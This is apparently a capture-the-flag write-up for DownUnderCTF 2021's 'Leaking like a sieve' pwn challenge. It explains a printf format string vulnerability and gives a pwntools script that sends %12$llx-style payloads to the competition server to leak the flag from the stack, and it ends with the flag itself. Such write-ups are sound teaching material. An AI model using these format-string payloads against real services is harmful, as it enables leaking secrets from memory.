# Leaking like a sieve

![](/2021/DownUnderCTF2021/Leaking_like_a_sieve/images/1.png)

Another easy pwn challenge of DownUnderCTF 2021

Check the ELF

![](/2021/DownUnderCTF2021/Leaking_like_a_sieve/images/2.png)

Use IDA to reverse

![](/2021/DownUnderCTF2021/Leaking_like_a_sieve/images/3.png)

The program read the flag in `flag.txt` and store it in s buffer, locate at rsp + 0x30

We see that the `printf(format)` function will cause a format string error, so we can leak any value at any address. In this challange, we need to leak the value of the flag at buffer s.

There are many ways to leak flags in this challange. 

  - We can leak the stack base at old_ebp of main function then compute the address of the array s and use %s to leak flag. 

  - Or use the second way that I did, the easier way is to leak each block of 8 characters of the flag. Use payload `%X$llx`, where X is offset. Our array S is located at rsp + 0x30, each offset is 8 bytes long, so let the offset of s be 6, plus 6 because the first 7 parameters in the 64-bit architecture are stored in registers.

The maximum length of flag is 32, so we need leak 4 times, each times 8 charracter, because the %x format will respone value at hex, so we need to use function `byte.fromhex()` to convert it to char.

File [solve.py](/2021/DownUnderCTF2021/Leaking_like_a_sieve/solve.py)

```python
from pwn import *
s = remote('pwn-2021.duc.tf', 31918)
flag = ''
s.sendlineafter(b'?\n', b'%12$llx')
s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]
s.sendlineafter(b'?\n', b'%13$llx')
s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]
s.sendlineafter(b'?\n', b'%14$llx')
s.recvuntil(b', ')
flag += bytes.fromhex(s.recv(16).decode('utf-8')).decode('utf-8')[::-1]
s.sendlineafter(b'?\n', b'%15$llx')
s.recvuntil(b', ')
flag += bytes.fromhex(s.recvline().strip().decode('utf-8')).decode('utf-8')[::-1]
s.close()
print(flag)
```

![](/2021/DownUnderCTF2021/Leaking_like_a_sieve/images/4.png)

`flag: DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`



